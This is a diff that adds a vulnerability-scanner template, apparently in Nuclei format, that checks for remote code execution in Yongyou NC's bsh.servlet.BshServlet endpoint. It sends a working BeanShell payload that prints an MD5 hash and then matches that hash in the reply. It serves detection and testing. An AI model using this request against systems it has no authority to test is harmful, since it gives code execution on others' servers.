@@ -1,0 +1,27 @@
+id: yongyou-nc-bshservlet-rce
+info:
+  name: Yongyou NC bsh.servlet.BshServlet Remote Code Execution Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    A command execution vulnerability exists in Yongyou NC, which can be exploited by attackers to obtain server privileges.
+  tags: rce
+
+variables:
+  random_payload: "{{rand_text_alphanumeric(16)}}"
+  random_md5: "{{md5(random_payload)}}"
+
+http:
+  - raw:
+      - |
+        POST /servlet/~ic/bsh.servlet.BshServlet HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        bsh.script=import+org.apache.commons.codec.digest.DigestUtils%3B%0D%0Aprint%28DigestUtils.md5Hex%28"{{random_payload}}"%29%29%3B%0D%0A%0D
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{random_md5}}"
